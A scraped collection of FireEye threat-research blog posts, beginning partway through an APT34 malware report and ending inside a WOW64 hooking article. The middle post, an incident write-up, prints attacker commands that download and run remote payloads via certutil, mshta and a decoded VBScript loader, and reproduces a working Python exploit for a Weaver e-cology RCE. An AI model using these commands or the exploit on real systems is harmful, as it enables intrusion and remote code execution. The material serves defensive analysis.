VALUEVAULT will call Windows PowerShell to extract browser history in order to match browser passwords with visited sites. A snippet of this function is shown in Figure 6. powershell.exe /c \"function get-iehistory {. [CmdletBinding()]. param (). . $shell = New-Object -ComObject Shell.Application. $hist = $shell.NameSpace(34). $folder = $hist.Self. . $hist.Items() | . foreach {. if ($_.IsFolder) {. $siteFolder = $_.GetFolder. $siteFolder.Items() | . foreach {. $site = $_. . if ($site.IsFolder) {. $pageFolder = $site.GetFolder. $pageFolder.Items() | . foreach {. $visit = New-Object -TypeName PSObject -Property @{ . URL = $($pageFolder.GetDetailsOf($_,0)) . }. $visit. }. }. }. }. }. }. get-iehistory Figure 6: Snippet of PowerShell code from VALUEVAULT to extract browser credentials Upon execution, VALUEVAULT creates a SQLITE database file in the AppData\\Roaming directory under the context of the user account it was executed by. This file is named fsociety.dat and VALUEVAULT will write the dumped passwords to this in SQL format. This functionality is not in the original version of the “Windows Vault Password Dumper”. Figure 7 shows the SQL format of the fsociety.dat file. Figure 7: SQL format of the VALUEVAULT fsociety.dat SQLite database VALUEVAULT’s function names are not obfuscated and are directly reviewable in strings analysis. Other developer environment variables were directly available within the binary as shown below. VALUEVAULT does not possess the ability to perform network communication, meaning the operators would need to manually retrieve the captured output of the tool. C:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/new_edge.go C:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/mozila.go C:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/main.go C:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/ie.go C:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/Chrome Password Recovery.go Figure 8: Golang files extracted during execution of VALUEVAULT LONGWATCH FireEye identified the binary WinNTProgram.exe (MD5:021a0f57fe09116a43c27e5133a57a0a) hosted on the malicious domain offlineearthquake[.]com . FireEye identifies this malware as LONGWATCH. The primary function of LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Windows temp folder. Interesting strings identified in the binary are shown in Figure 9. GetAsyncKeyState >---------------------------------------------------\\n\\n c:\\\\windows\\\\temp\\\\log.txt [ENTER] [CapsLock] [CRTL] [PAGE_UP] [PAGE_DOWN] [HOME] [LEFT] [RIGHT] [DOWN] [PRINT] [PRINT SCREEN] (1 space) [INSERT] [SLEEP] [PAUSE] \\n---------------CLIPBOARD------------\\n \\n\\n >>>  (2 spaces) c:\\\\windows\\\\temp\\\\log.txt Figure 9: Strings identified in a LONGWATCH binary Detecting the Techniques FireEye detects this activity across our platforms, including named detection for TONEDEAF, VALUEVAULT, and LONGWATCH. Table 2 contains several specific detection names that provide an indication of APT34 activity. Signature Name FE_APT_Keylogger_Win_LONGWATCH_1 FE_APT_Keylogger_Win_LONGWATCH_2 FE_APT_Keylogger_Win32_LONGWATCH_1 FE_APT_HackTool_Win_PICKPOCKET_1 FE_APT_Trojan_Win32_VALUEVAULT_1 FE_APT_Backdoor_Win32_TONEDEAF TONEDEAF BACKDOOR [DNS] TONEDEAF BACKDOOR [upload] TONEDEAF BACKDOOR [URI] Table 1: FireEye Platform Detections Endpoint Indicators Indicator MD5 Hash (if applicable) Code Family System.doc b338baa673ac007d7af54075ea69660b TONEDEAF 50fb09d53c856dcd0782e1470eaeae35 TONEDEAF ERFT-Details.xls 96feed478c347d4b95a8224de26a1b2c TONEDEAF DROPPER caf418cbf6a9c4e93e79d4714d5d3b87 TONEDEAF DROPPER b.exe 9fff498b78d9498b33e08b892148135f VALUEVAULT WindowsNTProgram.exe 021a0f57fe09116a43c27e5133a57a0a LONGWATCH PE86.dll d8abe843db508048b4d4db748f92a103 PICKPOCKET PE64.dll 6eca9c2b7cf12c247032aae28419319e PICKPOCKET Table 2: APT34 Endpoint Indicators from this blog post Network Indicators hxxp[://]www[.]cam-research-ac[.]com offlineearthquake[.]com c[.]cdn-edge-akamai[.]com 185[.]15[.]247[.]154 Acknowledgements A huge thanks to Delyan Vasilev and Alex Lanstein for their efforts in detecting, analyzing and classifying this APT34 campaign. Thanks to Matt Williams, Carlos Garcia and Matt Haigh from the FLARE team for the in-depth malware analysis. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/10/certutil-qualms-they-came-to-drop-fombs.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2019-10-29",
                    "source": "www.fireeye.com"
                },
                "text": "This blog post covers an interesting intrusion attempt that Mandiant Managed Defense thwarted involving the rapid weaponization of a recently disclosed vulnerability combined with the creative use of WMI compiled “.bmf” files and CertUtil for obfuscated execution. This intrusion attempt highlights a number of valuable lessons in security, chiefly: attackers work fast – faster than many security teams can react. Additionally, patching complex software environments while keeping the business operational makes it difficult to keep pace with attackers exploiting vulnerabilities, especially when these truths are coupled with rapid exploitation with innovative obfuscation methods utilizing the operating systems own feature set against it. Everybody’s Working for the Recon While monitoring our customers around the clock, FireEye Managed Defense identified suspicious file write activity on a system at a European manufacturing client and began our initial investigation by collecting the available volatile and non-volatile data from the affected host. Once evidence collection had completed, we began parsing the forensic data using the parsers available in FireEye's free Redline forensic analysis tool. Analysis of the logs quickly revealed that there were commands executed on the host which were consistent with interactive reconnaissance activity. Typically, once a host has successfully been compromised, attackers are presented with a command shell window which allows them to run commands on the host. These commands can consist of reconnaissance activity which expose useful information about the host to the attacker. The following is a snippet of the commands that we observed successfully executed on the host: ipconfig.exe ipconfig /all whoami.exe whoami The associated parent process that handled execution of the aforementioned listed processes was: \"\\Weaver\\jdk_new\\bin\\javaw.exe\". FOMBs AWAY! Once the attackers gained access to the web server by exploiting an unknown vulnerability, they attempted to further pivot control within the system through the use of Windows Management Instrumentation (WMI). They leveraged WMI's execution process, which takes Managed Object Format (MOF) files as input and compiles them into the WMI buffer, resulting in a compiled “.bmf” output file. The attackers wrote their second-stage payload and compiled it with WMI. Finally, they uploaded the compiled “.bmf” file to their web server and modified the file to masquerade as a \".rar\" file . Upon further assessment of the activity, we observed that after the threat actors gained access to the affected web server, they utilized a Windows native binary called “Certutil.exe” to download malicious code from a remote resource . Our investigation revealed that an instance of the process “Certutil.exe” was executed with the following command line arguments: certutil  -urlcache -split -f http://[DOMAIN]/uploads/180307/l.rar c:\\windows\\temp\\l.rar Options Description -urlcache Display or delete URL cache entries -split Split embedded ASN.1 elements, and save to files -f Force overwrite (Source: Microsoft certutil page ) FireEye has observed this methodology executed numerous times by both ethical hackers and unauthorized threat actors in addition to Certutil’s benign use as a part of legitimate business applications and operations. Shortly after the second-stage payload was downloaded, we observed several file write events related to `l.rar` (MD5: 4084eb4a41e3a01db2fe6f0b91064afa). Of particular note were: cmd.exe  cmd /c mofcomp.exe C:\\Windows\\temp\\l.rar cmd.exe cmd /c del C:\\Windows\\temp\\l.rar The aforementioned commands utilize Window's \"cmd.exe\" interpreter to run \"mofcomp.exe\" on the newly obtained \"l.rar\". This process is designed to parse a file containing MOF statements and add any class and class instances defined in the file to the WMI repository , and subsequently delete the aforementioned file. The use of “mofcomp.exe” for attackers and defenders was first proposed at MIRcon 2014 by FireEye Mandiant incident responders Christopher Glyer and Devon Kerr in their “There’s Something about WMI” talk (Figure 1). Figure 1: Proposed use of MOF files for red and blue teams We obtained the file \"l.rar\" for further analysis and observed that the file header began with \"FOMB\". This file header when conveniently flipped is \"BMOF\", as in Binary Managed Object Format. With this information in hand we began searching for methods to reverse the compiled binary. Upon analyzing the file in FireEye's sandbox environment, we were able to obtain the following information from the BMOF file: On Error Resume Next:execmydler():Function execmydler():Set P=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):P[.]Open \"GET\",\"hxxp[://[DOMAIN]/d/dl[.]asp\",0:P[.]Send():b=P[.]responseText:M=Spli t(b,\",\",-1,1):For Each Od In M:Nd=Nd+Chr(Od- 2):Next:Set P=Nothing:If Len(Nd) > 10 Then:Execute(Nd):End If:End In an attempt to masquerade activities, the attackers wrote an MOF script and compiled it into a BMOF file, then ran the malicious BMOF file on the victim machine via WMI. The aforementioned code attempts to download a second-stage payload from \"hxxp[://[DOMAIN]/d/dl[.]asp\" when executed. Since the WMI buffer is involved, this attack vector opens the door to gaining a persistent foothold in the victim environment. During this research period we also found an open-sourced project titled \"bmfdec\" that also decompiled BMOF files. Uncovering the Exploit The attackers were active on September 22, and as such the majority of the investigation was conducted around this timeframe. Analysis of FireEye Endpoint Security ring buffer events uncovered reconnaissance commands executed on the system including whoami , ipconfig and the downloading of additional binaries. However, further analysis of the system did not uncover an initial exploit within the same timeframe of these commands. Analysis of the HTTP logs also did not uncover the initial payload. Within the HTTP logs we identified suspicious HTTP POST requests including requests to ’/weaver/bsh.servlet.BshServlet/` , but this was a busy server and the payload was not included in the logging, only metadata. Example HTTP log entry '-` 2886000` 10.10.10.10` -` -` \"[23/Sep/2019:10:10:10 +0800]\"` \"POST /weaver/bsh.servlet.BshServlet/ HTTP/1.1\"`  \"-\"' FireEye Endpoint Security has the ability to collect a memory image and this was completed on the same day as the initial activity. As memory is volatile, the earlier it's collected in an investigation the more likely you are to uncover additional evidence. We used Volatility to analyze the memory image looking for any suspicious event log entries, process creation, registry entries, etc. While reviewing the memory image, we identified numerous instances of mshta.exe spawned under javaw.exe , the creation date for these processes was 2019-09-20, and we pivoted our investigative focus to that date. .. httpd.exe            2388    604      3     84 2019-06-28 09:32:53 UTC+0000 ... java.exe            2420   2388      0 ------ 2019-06-28 09:32:53 UTC+0000 .... javaw.exe          4804   2420     36    530 2019-06-28 09:33:19 UTC+0000 ..... javaw.exe         5976   4804    177   4925 2019-06-28 09:33:21 UTC+0000 ...... mshta.exe       17768   5976     12    320 2019-09-20 14:20:00 UTC+0000 ...... mshta.exe        9356   5976     12    306 2019-09-20 11:12:04 UTC+0000 ...... mshta.exe       22416   5976     12    310 2019-09-20 11:31:14 UTC+0000 ...... mshta.exe       23240   5976     13    318 2019-09-20 14:20:01 UTC+0000 ...... mshta.exe       15116   5976     12    311 2019-09-20 11:31:23 UTC+0000 This matched our initial findings and gave us some further context. Unfortunately, the initially-acquired forensic evidence, including the endpoint triage package and the memory image, did not provide a conclusive filesystem narrative around that date. At this stage the client had pulled the system offline and began remediation steps, however we still didn't know exactly which exploit was leveraged to gain a foothold on this system. We knew the process path which indicated it was httpd.exe being leveraged to run malicious javaw.exe commands. This lined up with our HTTP log analysis, yet we didn't have the payload. String it to Weaver Anybody who's worked in incident response long enough knows that when parsing the data has failed to uncover the evidence you're looking for, the last thing you can try is sifting through the raw bytes and strings of a file. Volatility has a handy feature to map the string offset to the corresponding process and virtual address. Once this is complete grep searching for specific keywords and filtering through the strings identified a number of HTTP POST requests sitting in unallocated space, expanding our grep using it's context parameter uncovered interesting HTTP POST requests and their payload. Example POST payload: POST /weaver/bsh.servlet.BshServlet/ HTTP/1.1 Host: x.x.x.x:88 Connection: close Accept-Encoding: gzip, deflate Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0 Accept-Language: en-US,en;q=0.5 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 134 bsh.script=eval .(\"ex\"+\"ec(\\\"mshta hxxp:// www[DOMAIN]/index[.]hta\\\")\");&bsh.servlet.output=raw23; languageidweaver=7; testBanCookie=test; JSESSIONID=xxxxxxxxxx; Systemlanguid=7 tBanCookie=test; Systemlanguid=7; loginidweaver=xxx st; Systemlanguid=7; loginidweaver=xxx We knew this was the exploit we were looking for. The payload was exactly what the attacker was executing and the URI confirmed the process path we had identified from the memory image. It was making a request to BshServlet . It was unclear if this vulnerability was known, as there was no CVE associated with the software. Open source research identified a number of Chinese blog sites discussing a newly identified RCE vulnerability with Weaver e-cology OA system. The vulnerability lies within the BeanShell component of the OA system. The attacker could send a specially crafted payload to ’\\weaver/bsh.servlet.BshServlet` in order to launch arbitrary commands. The following POC script was discovered on one of the aforementioned Chinese blog sites. MD5: 49b23c67c2a378fb8c76c348dd80ff61 import requests import sys headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Content-Type': 'application/x-www-form-urlencoded' } def exploit(url,cmd): target=url+'/weaver/bsh.servlet.BshServlet' payload='bsh.script=eval%00(\"ex\"%2b\"ec(\\\\\"cmd+/c+{}\\\\\")\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'.format(cmd) res=requests.post(url=target,data=payload,headers=headers,timeout=10) res.encoding=res.apparent_encoding print(res.text) if __name__ == '__main__': url=sys.argv[1] while(1): cmd=input('cmd:') exploit(url,cmd) The script contained some hardcoded HTTP header values including user-agent, accepted data types, accepted languages and content-type. The script builds an HTTP request and allows the user to specify the command they would like to run; it would then append the URL and command to the crafted exploit to execute. In our instance the attacker was leveraging this vulnerability to launch mshta.exe to download a second stage payload. Using search engines for internet connected devices such as Shodan or Censys we can quickly identify systems running the Weaver e-cology platform. Using this technique, we identified 28 internet facing system that are potentially vulnerable. Conclusion This isn't a new story; Managed Defense responds to cases like this every week. The usage of FOMB was particularly interesting in this instance and it's the first case in Managed Defense we've seen this technique being leveraged in an attempt to bypass defenses. When leveraged correctly, compiled “.bmf” files can be effectively used to sneak into an environment undetected and gain a foothold via persistence in the WMI buffer. There are many procedural and technical controls that could help prevent a system being compromised. Most larger enterprises are complex and identifying all publicly exposed software and services can be challenging. We’ve worked on many cases where system administrators didn’t believe their system was directly accessible from the internet only to later confirm it was. Prioritizing particular patches can be difficult and if you don’t think a RCE vulnerability is exposed then the Risk level might be incorrectly classified as low. A combination of controls is typically the best approach. In Managed Defense we assume these controls are imperfect and attackers will find a way to bypass them. Deploying strong monitoring capabilities combined with a team of analysts hunting through lower fidelity signatures or “weak signals” can uncover otherwise unnoticed adversaries. Learn more about Mandiant Managed Defense here . Catch an on-demand recap on this and the Top 5 Managed Defense attacks this year. Weaver Build Timeline 2019-09-20: Weaver Patch released 2019-09-20: Exploit observed in Managed Defense 2019-09-22: Exploit POC blogged 2019-10-03: First public mention outside China References Microsoft certutil page Microsoft mofcomp page bmfdec GitHub page Weaver Threat Alert Volatility GitHub page Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/11/wow64-subsystem-internals-and-hooking-techniques.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-11-09",
                    "source": "www.fireeye.com"
                },
                "text": "Microsoft is known for their backwards compatibility. When they rolled out the 64-bit variant of Windows years ago they needed to provide compatibility with existing 32-bit applications. In order to provide seamless execution regardless of application bitness, the WoW (Windows on Windows) system was coined. This layer, which will be referred to as ‘WOW64’ from here on out, is responsible for translating all Windows API calls from 32-bit userspace to the 64-bit operating system kernel. This blog post is broken up into two sections. First we start by diving deep into the WOW64 system. To do this, we trace a call from 32-bit userspace and follow the steps it takes to finally transition to the kernel. The second part of the post assesses two hooking techniques and their effectiveness. I will cover how this system works, the ways malware abuses it, and detail a mechanism by which all WoW syscalls can be hooked from userspace. Note that all information here is true as of Windows 10, version 2004 and in some cases has changed from how previous Windows versions were implemented. Recognition First and foremost, this is a topic which has existing research by multiple authors. This work was critical in efficient exploration of the internals and research would have taken much longer had these authors not publicly posted their awesome work. I would like to callout the following references: ( wbenny ): An extremely detailed view of WOW64 internals on ARM ( ReWolf ): A PoC heaven’s gate implementation ( JustasMasiulis ): A very clean C++ heaven’s gate implementation ( MalwareTech ): A WOW64 segmentation explanation WOW64 Internals To understand how the WOW64 system works internally we will explore the call sequence starting in 32-bit usermode before transitioning into the kernel from within a system DLL. Within these system DLLs the operating system will check arguments and eventually transition to a stub known as a syscall stub. This syscall stub is responsible for servicing the API call in the kernel. On a 64-bit system, the syscall stub is straightforward as it directly executes the syscall instruction as shown in Figure 1. Figure 1: Native x64 Syscall Stub Figure 2 shows a syscall stub for a 32-bit process running on WOW64 Figure 2: WOW64 Syscall Stub Notice that instead of a syscall instruction in the WOW64 version, Wow64SystemServiceCall is called. In the WOW64 system what would normally be an entry into the kernel is instead replaced by a call to a usermode routine. Following this Wow64SystemServiceCall , we can see in Figure 3 that it immediately performs an indirect jmp through a pointer named Wow64Transition . Figure 3: Wow64SystemService transitions through a pointer ‘Wow64Transition’ Note that the Wow64SystemServiceCall function is found within ntdll labeled as ntdll_77550000; a WOW64 process has two ntdll modules loaded, a 32-bit one and a 64-bit one. WinDbg differentiates between these two by placing the address of the module after the 32-bit variant. The 64-bit ntdll can be found in %WINDIR%\\System32 and the 32-bit in %WINDIR%\\SysWOW64. In the PDBs, the 64bit and 32bit ntdlls are referred to as ntdll.pdb and wntdll.pdb respectively, try loading them in a disassembler! Continuing with the call trace, if we look at what the Wow64Transition pointer holds we can see its destination is wow64cpu!KiFastSystemCall . As an aside, note that the address of wow64cpu!KiFastSystemCall is held in the 32-bit TEB (Thread Environment Block) via member WOW32Reserved, this isn’t relevant for this trace but is useful to know. In Figure 4 we see the body of KiFastSystemCall . Figure 4: KiFastSystemCall transitions to x64 mode via segment selector 0x33 The KiFastSystemCall performs a jmp using the 0x33 segment selector to a memory location just after the instruction. This 0x33 segment transitions the CPU into 64-bit mode via a GDT entry as described by (MalwareTech). Let's recap the trace we've performed to this point. We started from a call in ntdll, NtResumeThread. This function calls the Wow64SystemServiceCall function which then executes the Wow64Transition. The KiFastSystemCall performs the transition from 32-bit to 64-bit execution. The flow is shown in Figure 5. Figure 5: 32-bit to 64-bit transition The destination of the CPU transition jump is the 64-bit code show in Figure 6. Figure 6: Destination of KiFastSystemCall Figure 6 shows the first 64-bit instruction we’ve seen executed in this call trace so far. In order to understand it, we need to look at how the WOW64 system initializes itself. For a detailed explanation of this refer to (wbenny). For now, we can look at the important parts in wow64cpu!RunSimulatedCode . Figure 7: 64bit registers are saved in RunSimulatedCode Figure 7 depicts the retrieval of the 64-bit TEB which is used to access Thread Local Storage at slot index 1. Then the moving of a function pointer table into register r15. The TLS data retrieved is an undocumented data structure WOW64_CPURESERVED that contains register data and CPU state information used by the WOW64 layer to set and restore registers across the 32-bit and 64-bit boundaries. Within this structure is the WOW64_CONTEXT structure, partially documented on the Microsoft website . I have listed both structures at the end of this post. We’ll look at how this context structure is used later, but for our understanding of the jmp earlier all we need to know is that r15 is a function pointer table. It’s interesting to note at this point the architecture of the WOW64 layer. From the perspective of the 64-bit kernel the execution of 32-bit (Wow64) usermode applications is essentially a big while loop. The loop executes x86 instructions in the processor's 32-bit execution mode and occasionally exits the loop to service a system call. Because the kernel is 64-bit, the processor mode is temporarily switched to 64-bit, the system call serviced, then the mode switched back and the loop continued where it was paused. One could say the WOW64 layer acts like an emulator where the instructions are instead executed on the physical CPU. Going back to the jmp instruction we saw in Figure 6, we now know what is occurring. The instruction jmp [r15 + 0xF8] is equivalent to the C code jmp TurboThunkDispatch[0xF8 / sizeof(uint64_t)]. Looking at the function pointer at this index we can see we’re at the function wow64cpu!CpupReturnFromSimulatedCode (Figure 8). Figure 8: TurboThunk table's last function pointer entry is an exit routine This routine is responsible for saving the state of the 32-bit registers into the WOW64_CONTEXT structure we mentioned before as well as retrieving the arguments for the syscall. There is some trickiness going on here, so let’s examine this in detail. First a pointer to the stack is moved into r14 via xchg, the value at this location will be the return address from the syscall stub where Wow64SystemServiceCall was called. The stack pointer r14 is then incremented by 4 to get a pointer to where the stack should be reset when it’s time to restore all these context values. These two values are then stored in the context’s EIP and ESP variables respectively. The r14 stack pointer is then incremented one more time to get the location where the __stdcall arguments are (remember stdcall passes all arguments on the stack). This argument array is important for later, remember it. The arguments pointer is moved into r11, so in C this means that r11 is equivalent to an array of stack slots where each slot is an argument uint32_t r11[argCount]. The rest of the registers and EFlags are then saved. Once the 32-bit context is saved, the WOW64 layer then calculates the appropriate TurboThunk to invoke by grabbing the upper 16 bits of the syscall number and dispatches to that thunk. Note that at the beginning of this array is the function TurboDispatchJumpAddressEnd , shown in Figure 9, which is invoked for functions that do not support TurboThunks. Figure 9: TurboThunk table's first function pointer entry is an entry routine TurboThunks are described by (wbenny)—read his blog post at this point if you have not. To summarize the post, for functions that have simple arguments with widths <= sizeof(uint32_t) the WOW64 layer will directly widen these arguments to 64 bits via zero or sign-extension and then perform a direct syscall into the kernel. This all occurs within wow64cpu, rather than executing a more complex path detailed as follows. This acts as an optimization. For more complex functions that do not support TurboThunks the TurboDispatchJumpAddressEnd stub is used which dispatches to wow64!SystemServiceEx to perform the system call as shown in Figure 10. Figure 10: Complex system calls go through Wow64SystemServiceEx We’ll look at this routine in a moment as it’s the meat of this blog post, but for now let’s finish this call trace. Once Wow64SystemServiceEx returns from doing the system call the return value in eax is moved into the WOW64_CONTEXT structure and then the 32-bit register states are restored. There’s two paths for this, a common case and a case that appears to exist only to be used by NtContinue and other WOW64 internals. A flag at the start of the WOW64_CPURESERVED structure retrieved from the TLS slot is checked, and controls which restore path to follow as shown in Figure 11. Figure 11: CPU state is restored once the system call is done; there’s a simple path and a complex one handling XMM registers The simpler case will build a jmp that uses the segment selector 0x23 to transition back to 32-bit mode after restoring all the saved registers in the WOW64_CONTEXT . The more complex case will additionally restore some segments, xmm values, and the saved registers in the WOW64_CONTEXT structure and then will do an iret to transition back. The common case jmp once built is shown in Figure 12. Figure 12: Dynamically built jmp to transition back to 32bit mode At this point our call trace is complete. The WOW64 layer has transitioned back to 32-bit mode and will continue execution at the ret after Wow64SystemServiceCall in the syscall stub we started with. Now that an understanding of the flow of the WOW64 layer itself is understood, let’s examine the Wow64SystemServiceEx call we glossed over before. A little bit into the Wow64SystemServiceEx routine, Figure 13 shows some interesting logic that we will use later. Figure 13: Logging routines invoked before and after dispatching the syscalls The routine starts by indexing into service tables which hold pointers to routines that convert the passed argument array into the wider 64-bit types expected by the regular 64-bit system modules. This argument array is exactly the stack slot that was stored earlier in r14. Two calls to the LogService function exist, however these are only called if the DLL %WINDIR%\\system32\\wow64log.dll is loaded and has the exports Wow64LogInitialize, Wow64LogSystemService, Wow64LogMessageArgList, and Wow64LogTerminate. This DLL is not present on Windows by default, but it can be placed there with administrator privileges. The next section will detail how this logging DLL can be used to hook syscalls that transition through this wow64layer. Because the logging routine LogService is invoked before and after the syscall is serviced we can achieve a standard looking inline hook style callback function capable of inspecting arguments and return values. Bypassing Inline Hooks As described in this blog post, Windows provides a way for 32-bit applications to execute 64-bit syscalls on a 64-bit system using the WOW64 layer. However, the segmentation switch we noted earlier can be manually performed, and 64-bit shellcode can be written to setup a syscall. This technique is popularly called “Heaven’s Gate”. JustasMasiulis’ work call_function64 can be used as a reference to see how this may be done in practice (JustasMasiulis). When system calls are performed this way the 32-bit syscall stub that the WOW64 layer uses is completely skipped in the execution chain. This is unfortunate for security products or tracing tools because any inline hooks in-place on these stubs are also bypassed. Malware authors know this and utilize “Heaven’s Gate” as a bypass technique in some cases. Figure 14 and Figure 15 shows the execution flow of a regular syscall stub through the WOW64 layer, and hooked syscall stub where malware utilizes “Heaven’s Gate”. Figure 14: NtResumeThread transitioning through the WOW64 layer Figure 15: NtResumeThread inline hook before transitioning through the WOW64 layer As seen in Figure 15, when using the Heaven’s Gate technique, execution begins after the inline hook and WOW64 layer is done. This is an effective bypass technique, but one that is easy to detect from a lower level such as a driver or hypervisor. The easiest bypass to inline hooks is simply to restore the original function bytes, usually from bytes on disk. Malware such as AgentTesla and Conti has been known to utilize this last evasion technique. Hooking WOW64 via Inline Hooks As a malware analyst being able to detect when samples attempt to bypass the WOW64 layer can be very useful. The obvious technique to detect this is to place inline hooks on the 64-bit syscall stubs as well as the 32-bit syscall stubs. If the 64-bit hook detects an invocation that didn’t also pass through the 32-bit hook, then it’s known that a sample is utilizing Heaven’s Gate. This technique can detect both evasion techniques previously detailed. However, in practice this is very difficult to implement. Looking at the requirements that must be satisfied to hook the 64-bit syscall stub we come up with this list: Install 64-bit hook from a 32-bit module How do you read/write 64-bit address space from a 32-bit module? Implement a 64-bit callback from a 32-bit module Typically, inline hooking uses C functions as callback stubs, but we’re compiling a 32-bit module so we’ll have a 32-bit callback instead of the required 64-bit one. To solve the first challenge ntdll kindly provides the exports NtWow64ReadVirtualMemory64 , NtWow64WriteVirtualMemory64 , and NtWow64QueryInformationProcess64 . Using these it is possible to read memory, write memory, and retrieve the PEB of a 64-bit module from a 32-bit process. However, the second challenge is much harder as either shellcode or a JIT will be required to craft a callback stub of the right bitness. In practice ASMJIT may be utilized for this. This is however a very tedious technique to trace a large number of APIs. There are other challenges to this technique as well. For example, in modern Windows 10 the base address of ntdll64 is set to a high 64-bit address rather than a lower 32-bit address as in Windows 7. Due to this, supporting returns from callbacks back up to the original hooked stub and allocating a trampoline within the required memory range is difficult since the standard ret instruction doesn’t have enough bits on the stack to represent the 64-bit return address. As an aside, it should be noted that the WOW64 layer contains what is likely a bug when dealing with the NtWow64* functions. These APIs all take a HANDLE as first argument, which should be sign extended to 64-bits. However, this does not occur for these APIs, therefore when using the pseudo handle -1 the call fails with STATUS_INVALID_HANDLE . This bug was introduced in an unknown Windows 10 version. To successfully use these APIs OpenProcess must be used to retrieve a real, positive valued handle. I will not be covering the internals of how to inline hook the 64-bit syscall stub since this post is already very long. Instead I will show how my hooking library PolyHook2 can be extended to support cross-architecture hooking using these Windows APIs, and leave the rest as an exercise to the reader. This works because PolyHook’s trampolines are not limited to +-2GB and do not spoil registers. The internals of how that is achieved is a topic for another post. Figure 16 depicts how to overload the C++ API of polyhook to read/write memory using the aforementioned WinAPIs. Figure 16: Overloading the memory operations to read/write/protect 64-bit memory Once these inline hooks are in-place on the 64-bit syscall stubs, any application utilizing Heaven’s Gate will be properly intercepted. This hooking technique is very invasive and complicated and can still be bypassed if a sample was to directly execute a syscall instruction rather than using the 64-bit module’s syscalls stub. Therefore, a driver or hypervisor is more suitable to detect this evasion technique. Instead we can focus on the more common byte restoration evasion techniques and look for a way to hook the WOW64 layer itself. This doesn’t involve assembly modifications at all. Hooking WOW64 via LogService Thinking back to the WOW64 layer’s execution flow we know that all calls which are sent through the Wow64SystemServiceEx routine may invoke the routine Wow64LogSystemService if the logging DLL is loaded. We can utilize this logging DLL and routine to implement hooks which can be written the exact same way as inline hooks, without modifying any assembly. The first step to implementing this is to force all API call paths through the Wow64SystemServiceEx routine so that the log routine may be called. Remember earlier that those that support TurboThunks will not take this path. Lucky for us we know that any TurboThunk entry that points to TurboDispatchJumpAddressEnd will take this path. Therefore, by pointing every entry in the TurboThunk table to point at that address, the desired behavior is achieved. Windows kindly implements this patching via wow64cpu!BTCpuTurboThunkControl as shown in Figure 17. Figure 17: Patching the TurboThunk table is implemented for us Note that in previous Windows versions the module which exported this and how it did is different to Windows 10, version 2004. After invoking this patch routine all syscall paths through WOW64 go through Wow64SystemServiceEx and we can focus on crafting a logging DLL that man-in-the-middles (MITMs) all calls. There are a couple of challenges to be considered here: How do we determine which system call is currently occurring from the logging DLL? How are callbacks written? Wow64log is 64-bit DLL, we’d like a 32-bit callback. Is shellcode required, or can we make nice C style function callbacks? What APIs may we call? All that’s loaded is 64-bit ntdll. The first concern is rather easy, from within the wow64log DLL we can read the syscall number from the syscall stubs to create a map of number to name. This is possible because syscall stubs always start with the same assembly and the syscall number is at a static offset of 0x4. Figure 18 shows how we can then compare the values in this map against the syscall number passed to Wow64LogSystemService ’s parameter structure WOW64_LOG_SERVICE . typedef uint32_t* WOW64_ARGUMENTS; struct WOW64_LOG_SERVICE { uint64_t BtLdrEntry; WOW64_ARGUMENTS Arguments; ULONG ServiceTable; ULONG ServiceNumber; NTSTATUS Status; BOOLEAN PostCall; }; EXTERN_C __declspec(dllexport) NTSTATUS NTAPI Wow64LogSystemService(WOW64_LOG_SERVICE* service) { for (uint32_t i = 0; i < LAST_SYSCALL_ID; i++) { const char* sysname = SysCallMap[i].name; uint32_t syscallNum = SysCallMap[i].SystemCallNumber; if (ServiceParameters->ServiceNumber != syscallNum) continue; //LOG sysname } } Figure 18: Minimal example of determining which syscall is occurring—in practice the service table must be checked too Writing callbacks is a bit more challenging. The wow64log DLL is executing in 64-bit mode and we’d like to be able to write callbacks in 32-bit mode since it’s very easy to load additional 32-bit modules into a WOW64 process. The best way to handle this is to write shellcode which is capable of transitioning back to 32-bit mode, execute the callback, then go back to 64-bit mode to continue execution in the wow64log DLL. The segment transitions themselves are rather easy at this point, we know we just need to use 0x23 or 0x33 segment selectors when jumping. But we also need to deal with the calling convention differences between 64-bit and 32-bit. Our shellcode will therefore be responsible for moving 64-bit arguments’ register/stack slots to the 32-bit arguments register/stack slots. Enforcing that 32-bit callbacks may only be __cdecl makes this easier as all arguments are on the stack and the shellcode has full control of stack layout and cleanup. Figure 19 shows the locations of the arguments for each calling convention. Once the first 4 arguments are relocated all further arguments can be moved in a loop since it’s simply moving stack values into lower slots. This is relatively easy to implement using external masm files in MSVC. Raw bytes will need to be emitted at points rather than using the assembler due to the mix of architectures. Alternatively, GCC or Clang inline assembly could be used. ReWolf’s work achieves the opposite direction of 32-bit -> 64-bit and implements the shellcode via msvc inline asm. X64 MSVC doesn’t support this and there are complications with REX prefixes when using that method. It’s nicer to use external masm files and rely on the linker to implement this shellcode. Arg Number Cdecl Location Fastcall Location Special Case? 0 [ebp + 8] rcx Yes 1 [ebp + 12] rdx Yes 2 [ebp + 16] r8d Yes 3 [ebp + 20] r9d Yes 4 [ebp + 24] [rbp + 32 + 8] No 5 [ebp + 28] [rbp + 32 + 16] No 6 [ebp + 32] [rbp + 32 + 24] No Figure 19: Cdecl vs Fastcall argument positions Once this shellcode is written and wrapped into a 